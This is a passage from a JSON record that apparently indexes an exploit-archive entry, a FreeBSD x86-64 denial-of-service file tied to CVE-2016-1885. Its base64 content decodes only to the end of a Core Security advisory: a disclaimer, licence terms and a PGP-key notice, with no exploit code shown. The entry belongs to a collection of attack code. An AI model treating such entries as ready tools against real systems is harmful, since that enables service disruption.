ZWIgYXQ6IGh0dHA6Ly93d3cuY29yZXNlY3VyaXR5LmNvbS4NCg0KMTMuIERpc2NsYWltZXINCg0KVGhlIGNvbnRlbnRzIG9mIHRoaXMgYWR2aXNvcnkgYXJlIGNvcHlyaWdodCAoYykgMjAxNCBDb3JlIFNlY3VyaXR5IGFuZCAoYykgMjAxNCBDb3JlTGFicywgYW5kIGFyZSBsaWNlbnNlZCB1bmRlciBhIENyZWF0aXZlIENvbW1vbnMgQXR0cmlidXRpb24gTm9uLUNvbW1lcmNpYWwgU2hhcmUtQWxpa2UgMy4wIChVbml0ZWQgU3RhdGVzKSBMaWNlbnNlOiBodHRwOi8vY3JlYXRpdmVjb21tb25zLm9yZy9saWNlbnNlcy9ieS1uYy1zYS8zLjAvdXMvDQoNCjE0LiBQR1AvR1BHIEtleXMNCg0KVGhpcyBhZHZpc29yeSBoYXMgYmVlbiBzaWduZWQgd2l0aCB0aGUgR1BHIGtleSBvZiBDb3JlIFNlY3VyaXR5IGFkdmlzb3JpZXMgdGVhbSwgd2hpY2ggaXMgYXZhaWxhYmxlIGZvciBkb3dubG9hZCBhdCBodHRwOi8vd3d3LmNvcmVzZWN1cml0eS5jb20vZmlsZXMvYXR0YWNobWVudHMvY29yZV9zZWN1cml0eV9hZHZpc29yaWVzLmFzYy4NCg0KKi8=", 
    "filename": "platforms/freebsd_x86-64/dos/39570.c", 
    "id": "39570", 
    "cves": [
        "CVE-2016-1885"
    ]
}